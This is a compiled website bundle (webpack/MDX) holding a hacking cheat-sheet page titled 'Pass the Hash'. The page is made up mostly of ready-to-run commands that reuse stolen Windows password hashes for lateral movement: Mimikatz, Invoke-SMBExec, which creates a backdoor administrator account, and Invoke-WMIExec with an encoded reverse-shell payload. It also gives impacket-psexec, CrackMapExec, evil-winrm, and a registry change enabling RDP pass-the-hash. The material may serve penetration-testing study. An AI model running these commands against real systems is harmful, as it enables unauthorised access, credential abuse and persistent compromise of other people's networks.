"use strict";(self.webpackChunkhkb=self.webpackChunkhkb||[]).push([[332],{3905:(e,t,a)=>{a.d(t,{Zo:()=>h,kt:()=>u});var n=a(7294);function r(e,t,a){return t in e?Object.defineProperty(e,t,{value:a,enumerable:!0,configurable:!0,writable:!0}):e[t]=a,e}function s(e,t){var a=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),a.push.apply(a,n)}return a}function i(e){for(var t=1;t<arguments.length;t++){var a=null!=arguments[t]?arguments[t]:{};t%2?s(Object(a),!0).forEach((function(t){r(e,t,a[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(a)):s(Object(a)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(a,t))}))}return e}function o(e,t){if(null==e)return{};var a,n,r=function(e,t){if(null==e)return{};var a,n,r={},s=Object.keys(e);for(n=0;n<s.length;n++)a=s[n],t.indexOf(a)>=0||(r[a]=e[a]);return r}(e,t);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(n=0;n<s.length;n++)a=s[n],t.indexOf(a)>=0||Object.prototype.propertyIsEnumerable.call(e,a)&&(r[a]=e[a])}return r}var l=n.createContext({}),c=function(e){var t=n.useContext(l),a=t;return e&&(a="function"==typeof e?e(t):i(i({},t),e)),a},h=function(e){var t=c(e.components);return n.createElement(l.Provider,{value:t},e.children)},p="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},m=n.forwardRef((function(e,t){var a=e.components,r=e.mdxType,s=e.originalType,l=e.parentName,h=o(e,["components","mdxType","originalType","parentName"]),p=c(a),m=r,u=p["".concat(l,".").concat(m)]||p[m]||d[m]||s;return a?n.createElement(u,i(i({ref:t},h),{},{components:a})):n.createElement(u,i({ref:t},h))}));function u(e,t){var a=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var s=a.length,i=new Array(s);i[0]=m;var o={};for(var l in t)hasOwnProperty.call(t,l)&&(o[l]=t[l]);o.originalType=e,o[p]="string"==typeof e?e:r,i[1]=o;for(var c=2;c<s;c++)i[c]=a[c];return n.createElement.apply(null,i)}return n.createElement.apply(null,a)}m.displayName="MDXCreateElement"},709:(e,t,a)=>{a.r(t),a.d(t,{assets:()=>l,contentTitle:()=>i,default:()=>d,frontMatter:()=>s,metadata:()=>o,toc:()=>c});var n=a(7462),r=(a(7294),a(3905));const s={},i="Pass the Hash",o={unversionedId:"commands-cheatsheet/windows/pass-the-hash",id:"commands-cheatsheet/windows/pass-the-hash",title:"Pass the Hash",description:"Follow this link to access the Pass the Hash section.",source:"@site/docs/commands-cheatsheet/00-windows/pass-the-hash.md",sourceDirName:"commands-cheatsheet/00-windows",slug:"/commands-cheatsheet/windows/pass-the-hash",permalink:"/hkb/commands-cheatsheet/windows/pass-the-hash",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Dumping Credentials",permalink:"/hkb/commands-cheatsheet/windows/dumping-credentials"},next:{title:"Active Directory Hacking",permalink:"/hkb/commands-cheatsheet/active-directory-hacking"}},l={},c=[{value:"Mimikatz",id:"mimikatz",level:2},{value:"Invoke-TheHash",id:"invoke-thehash",level:2},{value:"SMBExec",id:"smbexec",level:3},{value:"WMIExec with reverse shell",id:"wmiexec-with-reverse-shell",level:3},{value:"Impacket",id:"impacket",level:2},{value:"PsExec",id:"psexec",level:3},{value:"CrackMapExec",id:"crackmapexec",level:2},{value:"evil-winrm",id:"evil-winrm",level:2},{value:"RDP with GUI",id:"rdp-with-gui",level:2},{value:"xfreerdp",id:"xfreerdp",level:3}],h={toc:c},p="wrapper";function d(e){let{components:t,...a}=e;return(0,r.kt)(p,(0,n.Z)({},h,a,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"pass-the-hash"},"Pass the Hash"),(0,r.kt)("p",null,"Follow ",(0,r.kt)("a",{parentName:"p",href:"/lateral-movement/windows/pass-the-hash"},"this link")," to access the Pass the Hash section."),(0,r.kt)("p",null,"You can steal the hashes by following the ",(0,r.kt)("a",{parentName:"p",href:"/commands-cheatsheet/windows/dumping-credentials"},"Dumping Credentials")," section."),(0,r.kt)("h2",{id:"mimikatz"},"Mimikatz"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-batch"},'mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<user> /rc4:<hash> /domain:<domain> /run:cmd.exe" "exit"\n')),(0,r.kt)("h2",{id:"invoke-thehash"},"Invoke-TheHash"),(0,r.kt)("h3",{id:"smbexec"},"SMBExec"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-powershell"},'Import-Module .\\Invoke-TheHash.psd1\nInvoke-SMBExec -Target <ip> -Domain <domain> -Username <user> -Hash <hash> -Command "net user attacker Password123 /add && net localgroup administrators attacker /add" -Verbose\n')),(0,r.kt)("h3",{id:"wmiexec-with-reverse-shell"},"WMIExec with reverse shell"),(0,r.kt)("p",null,"Create a reverse shell using ",(0,r.kt)("a",{parentName:"p",href:"https://www.revshells.com/"},"RevShells"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-powershell"},'Import-Module .\\Invoke-TheHash.psd1\nInvoke-WMIExec -Target <target> -Domain <domain> -Username <user> -Hash <hash> -Command "powershell -e <base64 encoded payload>"\n')),(0,r.kt)("h2",{id:"impacket"},"Impacket"),(0,r.kt)("h3",{id:"psexec"},"PsExec"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"impacket-psexec <user>@<ip> -hashes :<hash>\n")),(0,r.kt)("h2",{id:"crackmapexec"},"CrackMapExec"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"crackmapexec smb <ip> -u <user> -d . -H <hash>\n")),(0,r.kt)("admonition",{title:"Local Authentication",type:"info"},(0,r.kt)("p",{parentName:"admonition"},"If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add ",(0,r.kt)("inlineCode",{parentName:"p"},"--local-auth")," to our command.")),(0,r.kt)("h2",{id:"evil-winrm"},"evil-winrm"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"evil-winrm -i <ip> -u <user> -H <hash>\n")),(0,r.kt)("h2",{id:"rdp-with-gui"},"RDP with GUI"),(0,r.kt)("admonition",{title:"Restricted Admin Mode",type:"caution"},(0,r.kt)("p",{parentName:"admonition"},"Restricted Admin Mode, which is disabled by default, should be enabled on the target host."),(0,r.kt)("p",{parentName:"admonition"},"This can be enabled by adding a new registry key ",(0,r.kt)("inlineCode",{parentName:"p"},"DisableRestrictedAdmin (REG_DWORD)")," under ",(0,r.kt)("inlineCode",{parentName:"p"},"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Lsa")," with the value of ",(0,r.kt)("inlineCode",{parentName:"p"},"0"),". It can be done using the following command:"),(0,r.kt)("pre",{parentName:"admonition"},(0,r.kt)("code",{parentName:"pre",className:"language-batch"},"reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f\n"))),(0,r.kt)("h3",{id:"xfreerdp"},"xfreerdp"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"xfreerdp /v:<ip> /u:<user> /pth:<hash>\n")))}d.isMDXComponent=!0}}]);